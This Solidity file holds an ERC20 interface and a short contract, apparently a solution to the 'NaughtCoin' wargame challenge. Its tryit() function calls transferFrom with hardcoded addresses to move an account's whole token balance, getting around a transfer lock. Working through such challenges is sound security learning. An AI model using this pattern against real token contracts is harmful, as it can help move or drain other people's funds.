// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract NaughtCoin {
    IERC20 public en;

    constructor() {
        en = IERC20(address(0x0289E6b0B9AAe079dBE6F2102Cb9Ca1812b84291));
    }

    function tryit() public {
        en.transferFrom(
            0x9EE045b15dd36Ffb96C4576D5b0f01D142dbE0FA,
            address(en),
            en.balanceOf(0x9EE045b15dd36Ffb96C4576D5b0f01D142dbE0FA)
        );
    }
}
